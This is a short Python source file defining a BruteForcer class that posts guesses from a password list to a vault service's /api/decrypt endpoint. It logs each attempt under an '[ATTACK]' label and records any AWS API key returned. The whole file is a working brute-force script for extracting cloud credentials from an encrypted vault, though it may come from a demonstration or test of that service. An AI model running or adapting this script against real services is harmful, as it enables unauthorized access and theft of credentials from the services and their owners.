import requests 

class BruteForcer: 
    def __init__(self, api_url: str): 
        self.api_url = api_url 

    def attempt_passwords(self, vault: dict, password_list: list[str], vault_id: str | None = None): 
        results = [] 
    
        for password in password_list: 
            payload = {"password": password}
            if vault_id:
                payload["vault_id"] = vault_id
            else:
                payload["vault"] = vault

            response = requests.post(
                f"{self.api_url}/api/decrypt",
                json=payload,
            )

            try:
                data = response.json()
            except Exception:
                data = {"detail": "non-json response"}

            status = data.get("status")
            key = data.get("data", {}).get("aws_api_key")

            if response.status_code >= 400:
                print(
                    f"[ATTACK] Tried: {password} -> Request failed "
                    f"(HTTP {response.status_code}): {data.get('detail', data)}"
                )
            elif key is None:
                print(f"[ATTACK] Tried: {password} -> No aws_api_key in response: {data}")
            else:
                print(f"[ATTACK] Tried: {password} -> Got Key: {key}")

            results.append({
                "password": password,
                "key": key,
                "status": status,
                "http_status": response.status_code,
                "error": data.get("detail") if response.status_code >= 400 else None,
            })
    
        return results 
